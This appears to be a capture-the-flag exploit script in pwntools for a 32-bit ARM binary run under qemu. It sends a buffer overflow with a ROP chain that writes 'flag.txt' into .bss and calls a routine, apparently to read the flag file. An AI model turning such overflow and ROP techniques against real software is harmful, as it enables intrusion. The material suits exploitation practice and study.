from pwn import *
context(arch="arm", os="linux", endian="little", word_size=32)

io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "./pwn"])
#io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "-g", "1234", "./pwn"])

"""
.text:000105EC 00 30 84 E5                   STR     R3, [R4]
.text:000105F0 18 80 BD E8                   POP     {R3,R4,PC}

0x000105f4 : pop {r0, pc}

flag.txt
0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74
"""
bss = ELF("./pwn").bss() + 0x50

pay  = b'A'*0x24+ p32(0x105f0) + b'\x66\x6c\x61\x67' + p32(bss) + p32(0x105ec)
pay += b'\x2e\x74\x78\x74' + p32(bss+4) + p32(0x105ec) + b'AAAA'*2 + p32(0x105f4) + p32(bss) +p32(0x000104b0)
io.sendlineafter(b'> ', pay)
io.interactive()
